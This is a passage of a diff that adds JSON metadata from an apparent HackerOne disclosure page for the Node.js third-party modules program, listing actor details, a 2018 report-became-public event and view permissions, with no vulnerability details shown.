+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3279704,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-09-01T19:54:41.821Z",
+      "updated_at": "2018-09-01T19:54:41.821Z",
+      "actor": {
+        "url": "/nodejs-ecosystem",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Node.js third-party modules"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
